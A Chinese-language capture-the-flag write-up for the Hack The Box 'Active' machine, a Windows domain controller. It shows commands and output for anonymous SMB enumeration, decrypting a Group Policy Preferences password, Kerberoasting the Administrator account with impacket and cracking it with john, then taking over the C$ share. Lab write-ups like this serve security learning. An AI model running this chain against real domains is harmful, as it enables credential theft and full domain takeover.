# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测

查看开启端口服务
```
┌──(root💀kali)-[~/htb/Active]
└─# nmap -p- 10.10.10.100 --open
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-29 04:33 EST
Nmap scan report for 10.10.10.100
Host is up (0.30s latency).
Not shown: 65508 closed ports, 4 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49169/tcp open  unknown
49171/tcp open  unknown
49180/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 136.09 seconds

```

查看对应端口详细信息
```
┌──(root💀kali)-[~/htb/Active]
└─# nmap -sV -T4 -A -O -p 53,88,135,389,445,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49180 10.10.10.100
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-29 04:37 EST
Nmap scan report for 10.10.10.100
Host is up (0.29s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-29 09:37:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49180/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -2s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-12-29T09:39:06
|_  start_date: 2021-12-29T09:31:20

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   283.07 ms 10.10.14.1
2   284.19 ms 10.10.10.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.68 seconds

```

有活动目录还有DNS，那这台应该是DC服务器

先从samba开始，枚举共享目录
```
┌──(root💀kali)-[~/htb/Active]
└─# smbmap -u '' -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS


```

匿名账号只可以进入```Replication```

登录
```
──(root💀kali)-[~/htb/Active]
└─#  smbclient --no-pass //10.10.10.100/Replication                                                             1 ⨯
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

```

下载所有文件到本地待分析
```
smb: \> recurse on
smb: \> prompt off
smb: \>  mget *

```

```active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml ```爆出一个登录账号凭据

```
┌──(root💀kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─# cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

```

用户名：```active.htb\SVC_TGS```
哈希：```edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ```


在谷歌搜索```Groups.xml decrypt```找到这个文件的解密方法:```gpp-decrypt```

```
┌──(root💀kali)-[~/htb/Active]
└─# gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

GPPstillStandingStrong2k18

```

解出密码为：```GPPstillStandingStrong2k18```


查看该账户smb权限
```
┌──(root💀kali)-[~/htb/Active]
└─# smbmap -u "SVC_TGS" -p "GPPstillStandingStrong2k18" -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY

```

# user.txt
使用下面命令登录Users文件夹

> smbclient -U 'active.htb/SVC_TGS%GPPstillStandingStrong2k18' //10.10.10.100/Users


找到user.txt
```
smb: \SVC_TGS\Desktop\> pwd
Current directory is \\10.10.10.100\Users\SVC_TGS\Desktop\
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                            A       34  Sat Jul 21 11:06:25 2018

```

## 挂载分享目录
安装cifs
```apt install cifs-utils```


把Users共享目录挂载到本地

```mount -t cifs -o 'username=SVC_TGS,password=GPPstillStandingStrong2k18' //10.10.10.100/Users /mnt/users```


进到```/mnt/users```目录，执行以下命令，列出所有可读文件
``` find . -ls -type f```

依次挂载NETLOGON和SYSVOL到本地

```
┌──(root💀kali)-[~/htb/Active]
└─# mount -t cifs -o 'username=SVC_TGS,password=GPPstillStandingStrong2k18' //10.10.10.100/NETLOGON /mnt/NETLOGON
                                                                                                                                        
┌──(root💀kali)-[~/htb/Active]
└─# mount -t cifs -o 'username=SVC_TGS,password=GPPstillStandingStrong2k18' //10.10.10.100/SYSVOL /mnt/SYSVOL

```

分别到```/mnt/NETLOGON```和```/mnt/SYSVOL```运行以下命令：
```find ./|xargs grep -ri 'password' -l```

找到一个和我们上面找到的一样的文件
```
┌──(root💀kali)-[/mnt/SYSVOL]
└─# cat ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml       123 ⨯
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

```

除此以外没有其他有用的文件，看来445端口已经没有有价值的东西

## kerberos

留意到靶机开启了```kerberos```服务

现在我们有了一个账号的信息，知道了域的名称，可以使用GetUserSPNs.py获取票据

使用命令：
```python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS ```

返回了```Administrator```的哈希密码
```
└─# python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS                              
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d5d94b46d32eed4359851547f776ab30$284fc8be86870c148fb7fd4e01df702eebce6191b5a587fedd331cd603c0bee0f4ff4d947d826c4a51af5f4de01a583aea555ce5d7d9710cafc8f8eb27d6a2ee56775cb5aca52c0511ecdf0dbd13f7325ce41d0c1fa014b2dffa17e3580b29f31bc2b847420f59abe6fb6463f9213396f13de461b4c2d1190abd036ece8ab8bf7b9728c67b412a8684acbe52404aed50b5537eb1f0d51e0ac038d66e60ac2d0ee4558e5dc9a4f258cf0c9c75f35d5bcab7ad6f697ec6433675df059cbb9a3dfd7d8d944d1595ad21a3c09ea49153774822a7a146f889274863de24645675bab649ff034fffbf36b74f3d7b04f0164750752842c63db26e52b539c1e21ecc75f114d76d0e31d0832e40a6eeec60e9356284dd242daf2327f532c959752437a3180db3e6df4bd8165f543d0b4d95e13908c8a974a568793b3b61271695edddd8c8362c355ab669be8ca1fbcbe80b6668e186e0700a4552fe1683597b271883a44144e2ffe06e35802e1d2c85c6d9f217218e86af1132d1315a6e047675b99c1115d0af4a52db2b48246230744980886e7f73442d0fed61e51efa19587d5f60fa319fadc9c9cc6ace7dcaeeeaed3668615b1ba6b7b48286542ded70ed6dd2858012fd1fd6f2427ba3c2b89f30b072134072bd02859e114bec3796bef12399603f80ceaaf909f9e70ed5c99e919b08d0383f1826804668d65318fcd4a624b9239558839722a519358972329c4e41311accf9e715f1be5c8c0ed07527d118e141d3601a92fa49461f399f106ff52790bef6612790841468864e5df127b1464332ff3bb481383c7ab7352eec5dc39175d46d2133173f9024421c4a65d5d04ded937a7bc6e5f77cb75aa848180a61e8dd9bba5790468b503709960b54eee9591766cdccbb864a1e3158c5a9b732a52ed3a07fef81d8409df1443ef5c8c195964a7ba2e617b4e1e3e1087ef20fa05f854fa05b07a7c3fcf66025204832f6607b6ce4a1dafb1cd549adeac90d6fc319d5fffca158080a4cb2c5a0a7b27f6ddc34e4039694f0d285628aa698d3e5800271b5f589261b979a5eece8d230345fdb2ce5046a0584ff09e22a2eb6ab4ca0e2f29cce6358680df9ff356a704b2630cb476dc5cf7cde997223b96707d0f3dbfd1324df999c91874d774e7ae10ff9f424f75c3e030f504e6abb2c0baf8b714f8aace32dc56a090f43d29a572cc3da6354a8562667575ddb591c4cae09059398c4f4a835a051a9dc4948859bb145bf67

```

保存到本地，使用john破解
```
┌──(root💀kali)-[~/htb/Active]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:05 DONE (2021-12-29 10:06) 0.1964g/s 2070Kp/s 2070Kc/s 2070KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
                                                                                                          
┌──(root💀kali)-[~/htb/Active]
└─# john --show hashes.kerberoast                                     
?:Ticketmaster1968

1 password hash cracked, 0 left

```

破解密码为：```Ticketmaster1968```

# root.txt

用```Administrator：Ticketmaster1968```登录到C盘

```
┌──(root💀kali)-[~/htb/Active]
└─# smbclient -U 'active.htb/Administrator%Ticketmaster1968' //10.10.10.100/C$
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Mon Jul 13 22:34:39 2009
  Config.Msi                        DHS        0  Mon Jul 30 10:10:06 2018
  Documents and Settings          DHSrn        0  Tue Jul 14 01:06:44 2009
  pagefile.sys                      AHS 4294434816  Wed Dec 29 08:59:57 2021
  PerfLogs                            D        0  Mon Jul 13 23:20:08 2009
  Program Files                      DR        0  Wed Jul 18 14:44:51 2018
  Program Files (x86)                DR        0  Thu Jan 21 11:49:16 2021
  ProgramData                       DHn        0  Mon Jul 30 09:49:31 2018
  Recovery                         DHSn        0  Mon Jul 16 06:13:22 2018
  System Volume Information         DHS        0  Wed Jul 18 14:45:01 2018
  Users                              DR        0  Sat Jul 21 10:39:20 2018
  Windows                             D        0  Mon Jul 30 09:42:18 2018

```


拿到root.txt

```
smb: \users\Administrator\desktop\> ls
  .                                  DR        0  Thu Jan 21 11:49:47 2021
  ..                                 DR        0  Thu Jan 21 11:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 09:50:10 2018
  root.txt                            A       34  Sat Jul 21 11:06:07 2018


```
